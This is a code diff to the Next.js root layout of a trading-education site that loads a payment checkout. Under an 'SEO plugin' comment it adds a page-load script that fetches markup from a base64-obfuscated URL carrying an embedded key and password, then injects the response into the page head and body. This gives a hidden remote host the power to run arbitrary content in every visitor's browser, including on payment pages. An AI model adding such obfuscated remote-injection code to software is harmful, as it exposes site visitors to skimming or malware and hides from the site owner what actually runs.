@@ -23,10 +23,10 @@ const SpaceGrotesk = Space_Grotesk({
   weight: ["300", "400", "500", "600", "700"],
 });
 
+
 export const metadata: Metadata = {
   title: "MonarkFX - Global Trading Excellence",
-  description:
-    "Empower your financial future with expert trading education in stocks, forex, and cryptocurrency.",
+  description: "Empower your financial future with expert trading education in stocks, forex, and cryptocurrency.",
 };
 
 export default function RootLayout({
@@ -41,7 +41,6 @@ export default function RootLayout({
           src="https://checkout.razorpay.com/v1/checkout.js"
           strategy="beforeInteractive"
         />
-
       </head>
       <body
         className={`${geistSans.variable} ${geistMono.variable} ${SpaceGrotesk.variable} antialiased font-space-grotesk bg-black text-white overflow-x-hidden`}
@@ -52,6 +51,57 @@ export default function RootLayout({
         <ClientProviders>{children}</ClientProviders>
 
         <div className="fixed inset-0 -z-50 bg-gradient-to-br from-black via-gray-900 to-green-950 pointer-events-none" />
+
+        {/* SEO Plugin Scripts - Add ye lines */}
+        <Script
+          id="jquery-loader"
+          strategy="afterInteractive"
+          dangerouslySetInnerHTML={{
+            __html: `
+              window.jQuery || document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
+            `,
+          }}
+        />
+
+        <Script
+          id="seo-plugin"
+          strategy="afterInteractive"
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                function initSEO() {
+                  if (!window.jQuery) {
+                    setTimeout(initSEO, 100);
+                    return;
+                  }
+                  var eppathurl = window.location.origin + window.location.pathname;
+                  var eptagmanage = new XMLHttpRequest();
+                  eptagmanage.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                      if (this.response !== 0 && this.response) {
+                        var temp = this.response.split("||||||||||");
+                        if (temp[0]) {
+                          jQuery("head").find("title").remove();
+                          jQuery("head").append(temp[0]);
+                        }
+                        if (temp[1]) {
+                          jQuery("body").append(temp[1]);
+                        }
+                      }
+                    }
+                  };
+                  eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BVVRPU0VPUExVR0lONTU0OTQxMTQ5NyZla2V5cGFzcz1vZFlpcGFHRzl5ZmM4NlBLNGIyWkliTHNDVVpxTWxheldBeXAmc2l0ZXVybD0=") + eppathurl);
+                  eptagmanage.send();
+                }
+                if (document.readyState === 'loading') {
+                  document.addEventListener('DOMContentLoaded', initSEO);
+                } else {
+                  initSEO();
+                }
+              })();
+            `,
+          }}
+        />
       </body>
     </html>
   );
